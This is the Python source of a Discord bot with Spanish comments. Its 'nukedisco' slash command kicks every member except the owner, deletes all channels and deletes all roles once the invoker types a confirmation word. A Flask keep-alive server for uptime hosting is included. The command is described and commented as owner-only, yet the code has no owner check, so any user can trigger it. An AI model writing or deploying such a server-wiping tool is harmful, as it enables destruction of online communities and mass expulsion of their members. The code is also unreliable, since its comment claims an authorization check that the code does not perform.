import discord
from discord.ext import commands
import os
from dotenv import load_dotenv
import asyncio

# --- SERVIDOR WEB (Flask) para UptimeRobot ---
from flask import Flask
from threading import Thread

app = Flask('')

@app.route('/')
def home():
    return "Bot de Discord activo y funcionando :)"

def run():
    app.run(host='0.0.0.0', port=3000)

def keep_alive():
    t = Thread(target=run)
    t.start()

# --- CONFIGURACIÓN INICIAL ---
load_dotenv()
TOKEN = os.getenv('DISCORD_TOKEN')

# Intents
intents = discord.Intents.default()
intents.members = True
intents.message_content = True

# Crear bot
bot = commands.Bot(command_prefix="!", intents=intents)

# BOT LISTO
@bot.event
async def on_ready():
    print(f'¡Bot conectado como {bot.user}!')
    print(f'ID del bot: {bot.user.id}')
    print('------')
    try:
        await bot.tree.sync()
        print("Comandos de barra sincronizados correctamente.")
    except Exception as e:
        print(f"Error al sincronizar comandos: {e}")

# --- COMANDO DE BARRA: NUKEDISCO ---
@bot.tree.command(name="nukedisco", description="Ejecuta limpieza completa del servidor (solo para propietarios).")
async def nuke_discord(interaction: discord.Interaction):
    # Solo propietario

    # --- Defer para evitar timeout ---
    await interaction.response.defer(ephemeral=True)

    # Enviar advertencia
    warning_msg = (
        "⚠️ **¡ADVERTENCIA EXTREMA!** ⚠️\n\n"
        "Estás a punto de realizar una acción **IRREVERSIBLE** que:\n"
        "- Borrará **TODOS** los canales del servidor.\n"
        "- Borrará **TODOS** los roles (excepto @everyone y roles imposibles de borrar).\n"
        "- Expulsará a **TODOS** los miembros (excepto tú).\n\n"
        "Escribe `CONFIRMAR` en el chat dentro de los próximos 15 segundos para proceder."
    )
    await interaction.followup.send(warning_msg, ephemeral=False)

    # --- Esperar confirmación ---
    def check(m):
        return (
            m.author.id == interaction.user.id
            and m.channel.id == interaction.channel_id
            and m.content.upper() == "CONFIRMAR"
        )

    try:
        await bot.wait_for("message", check=check, timeout=15.0)
    except asyncio.TimeoutError:
        await interaction.followup.send("❌ Acción cancelada. No se recibió la confirmación a tiempo.", ephemeral=True)
        return

    print(f"🔥 INICIANDO LIMPIEZA de {interaction.guild.name} 🔥")
    await interaction.followup.send("🔥 INICIANDO LIMPIEZA... 🔥", ephemeral=False)

    # --- 1. Expulsar miembros ---
    for member in interaction.guild.members:
        if member.id not in (interaction.guild.owner_id, bot.user.id):
            try:
                await member.kick(reason="Nuke command executed by server owner.")
                print(f"Expulsado: {member.name}")
            except discord.Forbidden:
                print(f"No se pudo expulsar a {member.name} (Permisos insuficientes).")
            except Exception as e:
                print(f"Error al expulsar a {member.name}: {e}")

    # --- 2. Borrar canales ---
    for channel in interaction.guild.channels:
        try:
            await channel.delete(reason="Nuke command executed.")
            print(f"Canal borrado: {channel.name}")
        except discord.Forbidden:
            print(f"No se pudo borrar el canal {channel.name} (Permisos insuficientes).")
        except Exception as e:
            print(f"Error al borrar el canal {channel.name}: {e}")

    # --- 3. Borrar roles ---
    for role in interaction.guild.roles:
        if role.is_default():  # Evitar @everyone
            continue
        try:
            await role.delete(reason="Nuke command executed.")
            print(f"Rol borrado: {role.name}")
        except discord.Forbidden:
            print(f"No se pudo borrar el rol {role.name} (Permisos insuficientes).")
        except Exception as e:
            print(f"Error al borrar el rol {role.name}: {e}")

    print("💣 LIMPIEZA COMPLETADA 💣")
    print("💥 Todos los logs se imprimen en consola.")

# --- EJECUTAR BOT ---
keep_alive()  # 🔥 Inicia el servidor Flask
bot.run(TOKEN)